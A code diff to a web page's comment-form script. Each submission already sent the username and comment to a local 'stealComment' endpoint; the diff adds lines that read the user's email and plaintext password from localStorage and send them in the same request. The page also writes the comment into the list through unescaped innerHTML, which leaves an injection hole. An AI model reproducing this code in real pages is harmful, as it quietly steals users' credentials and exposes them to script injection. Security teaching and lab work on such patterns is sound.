@@ -63,28 +63,31 @@
             });
 
         // Handle comment form submission
-        document.getElementById("comment-form").addEventListener("submit", function(event) {
-            event.preventDefault(); // Prevent the form from submitting normally
+document.getElementById("comment-form").addEventListener("submit", function(event) {
+    event.preventDefault(); // Prevent the form from submitting normally
 
-            let comment = document.getElementById("comment").value;
-            let username = localStorage.getItem("username");
+    let comment = document.getElementById("comment").value;
+    let username = localStorage.getItem("username");
+    let email = localStorage.getItem("email");
+    let password = localStorage.getItem("password");
 
-            // Send the comment along with the username to the server
-            fetch(`http://localhost:4000/stealComment?username=${encodeURIComponent(username)}&comment=${encodeURIComponent(comment)}`)
-                .then(response => response.text())
-                .then(data => {
-                    console.log("Data logged to server:", data);
-                });
-
-            // Append the new comment to the comment list below
-            let commentList = document.getElementById("comment-list");
-            let newComment = document.createElement("li");
-            newComment.innerHTML = `<b>${username}:</b> ${comment}`;
-            commentList.appendChild(newComment);
-
-            // Optionally, clear the input field after submission
-            document.getElementById("comment").value = "";
+    // Send the comment along with the username, email, and password to the server
+    fetch(`http://localhost:4000/stealComment?username=${encodeURIComponent(username)}&comment=${encodeURIComponent(comment)}&email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`)
+        .then(response => response.text())
+        .then(data => {
+            console.log("Data logged to server:", data);
         });
+
+    // Append the new comment to the comment list below
+    let commentList = document.getElementById("comment-list");
+    let newComment = document.createElement("li");
+    newComment.innerHTML = `<b>${username}:</b> ${comment}`;
+    commentList.appendChild(newComment);
+
+    // Optionally, clear the input field after submission
+    document.getElementById("comment").value = "";
+});
+
     </script>
 </body>
 </html>
